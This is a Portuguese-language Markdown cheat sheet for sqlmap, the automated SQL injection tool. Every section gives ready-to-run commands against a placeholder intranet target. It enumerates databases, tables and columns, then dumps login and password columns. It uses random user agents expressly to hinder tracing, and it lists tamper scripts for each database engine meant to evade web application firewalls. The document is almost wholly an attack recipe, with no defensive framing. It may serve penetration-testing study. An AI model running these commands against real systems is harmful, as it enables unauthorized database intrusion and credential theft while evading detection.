# SQLMAP

Ferramente para automatização de SQL Injection.  
<http://sqlmap.org>

---

Testar todos os bancos de dados de um URL:

```bash
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --dbs
```

---

Especificar um determinado banco de dados:

```bash
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql
```

*O **current-db** pega o banco de dados em execução no momento.*

---

Utilizar um agente randômico para dificultar a rastreabilidade:

```bash
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql --random-agent
```

---

Acessando o banco de dados e listando as tabelas:

```bash
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --dbms=mysql --random-agent -D nomedobanco --tables
```

---

Listando as colunas da tabela:

```bash
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql --random-agent -D nomedobanco -T nomedatabela --columns
```

---

Efetuando o dump das informações:

```bash
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql --random-agent -D nomedobanco -T nomedatabela -C 'login,password' --dump
```

*Acima foi efetuado o dump na coluna **login** e **password**.*

---

Há alguns scripts de tamper no sequinte diretório:  
**/usr/share/sqlmap/tamper/**

Utilizando o tamper:

```bash
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql --random-agent --tamper="namescript.py"
```

**General scripts:**

```bash
--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

**Microsoft access:**

```bash
--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```

**Microsoft SQL Server:**

```bash
--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

**MySQL:**

```bash
--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```

**Oracle:**

```bash
--tamper=between,charencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor
```

**PostgreSQL:**

```bash
--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,xforwardedfor
```

**SAP MaxDB:**

```bash
--tamper=ifnull2ifisnull,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,unionalltounion,unmagicquotes,xforwardedfor
```

**SQLite:**

```bash
--tamper=ifnull2ifisnull,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2dash,space2plus,unionalltounion,unmagicquotes,xforwardedfor
```

---

Tentando formulário:

```bash
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql --random-agent --forms
```

---

Especificando formulário para testar:

```bash
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql --random-agent --data="campo3="
```
